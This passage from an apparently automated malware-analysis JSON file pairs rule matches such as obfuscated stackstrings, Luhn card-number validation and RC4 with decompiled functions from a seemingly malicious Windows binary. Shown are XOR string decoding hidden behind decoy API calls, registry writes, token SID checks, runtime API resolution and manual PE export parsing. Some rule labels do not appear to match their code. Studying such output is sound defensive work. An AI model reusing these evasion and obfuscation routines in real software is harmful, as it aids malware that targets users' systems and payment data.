= _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (hKey != 0) {\n        var_14h = 0x73206727;\n        var_10h = 0x4f096420;\n        var_ch = 0x67645507;\n        var_8h = 0x734f6764;\n        var_4h._0_1_ = 0x55;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_48h = &var_14h - iVar8;\n        var_3ch = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar6 != 0xe2da98) {\n                *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_14h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_38h = 6;\n        var_24h = 6;\n        var_23h = 0x5654;\n        var_21h._0_1_ = 0x35;\n        var_21h._1_1_ = 0x23;\n        var_21h._2_2_ = 0x3e6c;\n        var_1dh._0_1_ = 0x54;\n        var_1dh._2_2_ = 0x5735;\n        var_19h._0_1_ = 0x6c;\n        var_10h = 0x35375456;\n        var_ch = CONCAT22(var_ch._2_2_, 0x6c57);\n        var_1dh._1_1_ = var_24h;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_48h = &var_24h + -iVar8;\n        var_8h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar6 != 0xa6ede9) {\n                *(iVar5 + iVar8) = *(&var_10h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_24h + -iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_28h._0_2_ = 0x7707;\n        var_28h._2_1_ = 0x36;\n        var_28h._3_1_ = 0x30;\n        var_24h = 0x24;\n        var_23h = 0x2068;\n        var_21h._0_1_ = 0x77;\n        var_21h._1_1_ = 0x3a;\n        var_21h._2_2_ = 0x2830;\n        var_1dh._0_1_ = 0x68;\n        var_1dh._1_1_ = 0x3a;\n        var_1dh._2_2_ = 0x6277;\n        var_19h._0_1_ = 0x30;\n        var_19h._1_1_ = 0x47;\n        var_19h._2_1_ = 0x68;\n        var_10h = 0x30537754;\n        var_ch = CONCAT22(var_ch._2_2_, 0x6847);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_48h = &var_28h - iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (iVar6 != 0x55cb5f) {\n                *(iVar5 + iVar8) = *(&var_10h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_28h - iVar8];\n            }\n            pcVar7 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_3ch, 0, 4, &var_bch, 4);\n        iVar5 = var_8h;\n        piVar4 = var_b4h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, var_8h, 0, 1, var_b4h, (piVar4 - (var_b4h + 1) >> 1) * 2);\n        var_8h = var_b0h + 1;\n        piVar4 = var_b0h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, iVar8, 0, 1, var_b0h, (piVar4 - var_8h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar7)(0, var_3ch);\n        (*pcVar2)(uVar3);\n        iVar8 = var_44h;\n    }\n    piVar4 = var_b0h;\n    uVar3 = (*pcVar7)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 3006
    },
    "0040e944": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e944(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t iVar7;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar *pszFirst;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0;\n    pszFirst = puVar4;\n    fcn.0040b474();\n    if (puVar4 == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_7ch = 0x43134a74;\n        var_78h = 0x4a01372a;\n        var_74h = 0x373b4316;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_70h = 0x43134a05;\n        var_6ch = 0x4a0d375f;\n        var_68h = 0x3713431f;\n        var_64h = 0x43204a32;\n        var_60h = 0x4a223715;\n        var_5ch = 0x371c433d;\n        var_58h = 0x430e4a25;\n        var_54h = 0x4a3f3733;\n        var_50h = 0x371f4326;\n        var_4ch = 0x433c4a23;\n        var_48h = 0x4a25371f;\n        var_44h = 0x373f4372;\n        var_40h = 0x43224a29;\n        var_3ch = 0x4a3e3716;\n        var_38h = 0x371f4320;\n        var_34h = 0x430e4a23;\n        var_30h._0_2_ = 0x377a;\n        var_1ch = 0x43524a51;\n        var_18h._0_2_ = 0x377a;\n        uVar3 = (*pcVar1)(8, 0x9d);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_4h = 6;\n        iVar7 = 0;\n        var_ch = iVar6;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar5 != 0x4ec927) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_7ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n        var_4ch = 0x42496c14;\n        var_48h = 0x6c136d36;\n        var_44h = 0x6d284255;\n        var_40h = 0x42426c17;\n        var_3ch = 0x6c016d2a;\n        var_38h = 0x6d294259;\n        var_34h = 0x42306c02;\n        var_2ch = 0x42306c67;\n        var_28h._0_2_ = 0x6d45;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_1ch = iVar6;\n        var_14h = &var_4ch - iVar6;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            puVar4 = pszFirst;\n            if (iVar5 != 0x198c9f) {\n                *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_4ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1c);\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar6);\n        if (iVar7 != 0) {\n            var_58h = 0x7119724f;\n            var_54h = 0x72196b3d;\n            var_50h = 0x6b21713e;\n            var_4ch = 0x71187207;\n            var_48h = 0x72056b2b;\n            var_44h = 0x6b61713e;\n            var_40h = 0x711e7236;\n            var_3ch = 0x72196b25;\n            var_38h = 0x6b377121;\n            var_34h = 0x714a7236;\n            var_2ch = 0x714a726a;\n            var_28h._0_2_ = 0x6b44;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_14h = &var_58h - iVar6;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                puVar4 = pszFirst;\n                if (iVar5 != 0x7b236c) {\n                    *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar6 = var_1ch;\n        }\n        iVar7 = var_ch;\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41dac0);\n        uVar3 = extraout_ECX;\n        iVar5 = fcn.0040aa7f(var_20h);\n        if (iVar5 == 0) {\n            fcn.0040cb61(uVar3);\n            fcn.0040a63a();\n            var_10h = fcn.0040e7fb();\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar7);\n        (*pcVar1)(uVar3);\n    }\n    return var_10h;\n}\n",
        "token_count": 2010
    },
    "0040f376": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040f376(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x52674f2a;\n                var_30h = 0x4a62796b;\n                var_2ch = 0x4f545a67;\n                var_28h = 0x7962527b;\n                var_24h._0_2_ = 0x4a4f;\n                var_20h = 0x524a4f79;\n                var_1ch._0_1_ = 0x5a;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                    if (iVar5 != 0x27fe5b) {\n                        var_10h = 5;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 877
    },
    "0040f59b": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f59b(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint *var_94h;\n    uint *var_90h;\n    uint var_88h;\n    uint hObject;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t lpLibFileName;\n    uint var_48h;\n    uint8_t var_44h;\n    uint32_t var_43h;\n    uint var_3fh;\n    uchar var_3bh;\n    uchar uStack62;\n    uchar var_39h;\n    uint var_38h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint32_t var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint32_t var_15h;\n    uint32_t var_11h;\n    uint var_dh;\n    uint var_9h;\n    uchar var_5h;\n    uint8_t *lpszLongPath;\n    \n    lpszLongPath = *0x41dd68;\n    var_38h._0_2_ = 0x454d;\n    puVar9 = &lpDst;\n    for (iVar7 = 0x410; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    stack0xffffffc7 = 0x2b681057;\n    var_31h = 0x1793372;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2dh = 0x5c570045;\n    var_29h = 0x24721968;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_25h = 0x1451179;\n    var_21h = 0x20680d57;\n    puVar9 = &lpszShortPath;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_60h = 5;\n    var_38h._2_1_ = 5;\n    var_1dh = 0x5b793a72;\n    var_19h = 0x25574045;\n    var_15h = 0x3a722668;\n    var_11h = 0x5c450c79;\n    var_dh = 0x3d681c57;\n    var_9h._0_1_ = 0x72;\n    var_9h._1_2_ = 0x7932;\n    var_9h._3_1_ = 0x68;\n    var_5h = 0x45;\n    var_5ch = 0x57724568;\n    var_58h._0_1_ = 0x79;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_68h = iVar7;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x8459df) {\n            *(iVar8 + iVar7) = *(&var_5ch + iVar8 % var_60h) ^ (iVar8 + iVar7)[&var_38h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_25h = var_25h & 0xff | 0x7a796200;\n    var_21h = 0x59422664;\n    var_1dh = 0x31454655;\n    var_19h = 0x24642179;\n    var_15h = 0x10550b42;\n    var_11h = 0x70796245;\n    var_dh = 0x5b423664;\n    var_9h._0_1_ = 0x55;\n    var_9h._1_2_ = 0x4564;\n    var_54h = 0x64557942;\n    var_50h._0_1_ = 0x45;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_25h + (1 - iVar7);\n    var_5ch = iVar7;\n    lpszLongPath = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0x765ea5) {\n            *(iVar3 + iVar7) = *(&var_54h + iVar3 % var_60h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar7, &lpszShortPath);\n    var_43h = 0x38391436;\n    var_3fh = 0x4a615777;\n    var_3bh = 0x56;\n    uStack62 = 0x77;\n    var_39h = 0x36;\n    puVar9 = &var_a4h;\n    for (iVar7 = 0x3c; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_44h = 5;\n    lpLibFileName = 0x39613677;\n    var_48h._0_1_ = 0x56;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_98h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_54h = var_98h;\n    lpszLongPath = &var_44h + -var_98h;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar8 != 0x9ef534) {\n            *(iVar7 + var_98h) = *(&lpLibFileName + iVar7 % var_60h) ^ (iVar7 + var_98h)[&var_44h + -var_98h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_94h = &lpDst;\n    var_a4h = 0x3c;\n    var_90h = &ARG_0;\n    var_88h = 3;\n    var_a0h = 0x40;\n    var_64h = 6;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_11h = var_11h & 0xff | 0xb291600;\n    var_dh = 0x53760078;\n    var_9h._0_1_ = 0x60;\n    var_9h._1_2_ = 0x2050;\n    var_9h._3_1_ = 0x29;\n    var_5h = 0x61;\n    var_43h = var_43h & 0xffffff | 0x45000000;\n    var_3fh = 0x4c344e61;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_11h + (1 - iVar7);\n    lpLibFileName = iVar7;\n    lpszLongPath = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0xec74dc) {\n            *(iVar3 + iVar7) = *(&var_43h + iVar3 % var_60h + 3) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0xc);\n    var_15h = var_15h & 0xff | 0x565d1b00;\n    var_11h = 0x30302b1e;\n    var_dh = 0x33075050;\n    var_9h._0_1_ = 0x10;\n    var_9h._1_2_ = 0x4d0d;\n    var_9h._3_1_ = 100;\n    var_5h = 0x72;\n    var_43h = var_43h & 0xffffff | 0x48000000;\n    var_3fh = 0x47723335;\n    var_3bh = 0x75;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_15h + (1 - iVar7);\n    lpszLongPath = iVar8;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x52e58b) {\n            *(iVar3 + iVar7) = *(&var_43h + iVar3 % var_64h + 3) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_9ch = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*pcVar6)(&var_a4h);\n        if (iVar8 != 0) break;\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar8 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_5ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_68h);\n    (*pcVar6)(uVar2);\n    return 1;\n}\n",
        "token_count": 2918
    },
    "0040263b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040263b(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41dad0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41dad0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 114
    },
    "00405ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00405ac0(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41dd68);\n    iVar4 = fcn.0040b3fd();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x00405b50;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x00405b50:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 472
    },
    "00405b5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00405b5a(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 269
    },
    "00405ef9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405ef9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "00405f18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405f18(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00405ef9();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "00405f9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405f9e(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 256
    },
    "00406005": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
